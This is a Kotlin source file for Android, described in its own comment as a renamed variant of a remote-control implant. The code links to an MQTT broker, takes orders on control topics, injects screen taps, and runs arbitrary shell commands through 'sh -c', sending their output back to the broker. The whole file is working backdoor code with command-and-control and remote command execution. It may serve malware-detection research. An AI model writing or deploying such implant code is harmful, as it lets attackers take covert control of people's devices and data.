package com.example.remoteunit

import android.app.Instrumentation
import android.view.MotionEvent
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken
import org.eclipse.paho.client.mqttv3.MqttCallback
import org.eclipse.paho.client.mqttv3.MqttClient
import org.eclipse.paho.client.mqttv3.MqttMessage

// Renamed variant of the XCPE remote-control implant: every application
// identifier, host, and topic differs from the recorded sample, and the
// tasked input is a pointer tap instead of a keystroke. Only
// platform/library API surfaces (MQTT callback, Instrumentation input
// injection, shell-form exec) are shared with the original.
class InputTaskingVariant : MqttCallback {
    private lateinit var link: MqttClient
    private val inst = Instrumentation()

    fun start() {
        link = MqttClient("tcp://broker.example.org:1883", "unit-9")
        link.setCallback(this)
        link.connect()
        link.subscribe("units/9/control/#")
    }

    override fun messageArrived(topic: String, message: MqttMessage) {
        val order = String(message.payload)
        when {
            topic.endsWith("/tap") -> {
                val parts = order.split(",")
                val x = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
                val y = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
                val down = MotionEvent.obtain(0L, 0L, MotionEvent.ACTION_DOWN, x, y, 0)
                val up = MotionEvent.obtain(0L, 0L, MotionEvent.ACTION_UP, x, y, 0)
                inst.sendPointerSync(down)
                inst.sendPointerSync(up)
            }
            topic.endsWith("/exec") -> {
                val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", order))
                link.publish("units/9/out", proc.inputStream.readBytes(), 1, false)
            }
        }
    }

    override fun deliveryComplete(token: IMqttDeliveryToken?) {}
    override fun connectionLost(cause: Throwable?) {}
}
